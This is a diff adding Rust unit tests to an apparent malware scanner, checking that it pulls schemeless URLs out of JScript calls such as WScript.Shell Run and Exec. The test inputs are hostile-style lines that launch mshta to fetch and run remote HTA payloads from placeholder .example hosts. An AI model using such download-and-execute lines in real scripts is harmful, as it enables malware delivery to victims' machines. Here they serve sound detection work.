@@ -29880,6 +29880,132 @@ mod js_url_extraction_tests {
     }
 
     #[test]
+    fn js_wscript_shell_run_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"new ActiveXObject("WScript.Shell").Run("mshta js-run.example/payload.hta");"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "http://js-run.example/payload.hta"
+            )),
+            "JS WScript.Shell.Run schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_wscript_shell_lowercase_run_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"new ActiveXObject("WScript.Shell").run("mshta js-lower-run.example/payload.hta");"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "http://js-lower-run.example/payload.hta"
+            )),
+            "JS WScript.Shell lowercase run schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_wscript_shell_run_variable_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var cmd = "mshta js-run-var.example/payload.hta";
+new ActiveXObject("WScript.Shell").Run(cmd);"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "http://js-run-var.example/payload.hta"
+            )),
+            "JS WScript.Shell.Run variable schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_wscript_shell_run_array_join_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"new ActiveXObject("WScript.Shell").Run(["mshta ","js-run-array.example/payload.hta"].join(""));"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "http://js-run-array.example/payload.hta"
+            )),
+            "JS WScript.Shell.Run array-join schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_wscript_shell_bracket_run_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"new ActiveXObject("WScript.Shell")["Run"]("mshta js-bracket-run.example/payload.hta");"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "http://js-bracket-run.example/payload.hta"
+            )),
+            "JS WScript.Shell bracket Run schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_non_wsh_bracket_run_does_not_emit_download() {
+        let mut env = Environment::new(&Config::default());
+        let js = br#"var task = {};
+task["Run"]("mshta js-bracket-run-fp.example/payload.hta");"#
+            .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            !env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. }
+                    if src == "http://js-bracket-run-fp.example/payload.hta"
+            )),
+            "generic JS bracket Run should not be treated as WSH execution: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn js_wscript_shell_exec_schemeless_url_extracted() {
+        let mut env = Environment::new(&Config::default());
+        let js =
+            br#"new ActiveXObject("WScript.Shell").Exec("mshta js-exec.example/payload.hta");"#
+                .to_vec();
+        env.all_extracted_jscript.push(js);
+        crate::js_scan::scan_js_payloads(&mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "http://js-exec.example/payload.hta"
+            )),
+            "JS WScript.Shell.Exec schemeless URL missed: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn js_u_escape_decoded() {
         let mut env = Environment::new(&Config::default());
         // eval("http://x.com") directly — no u-escapes needed for this basic test
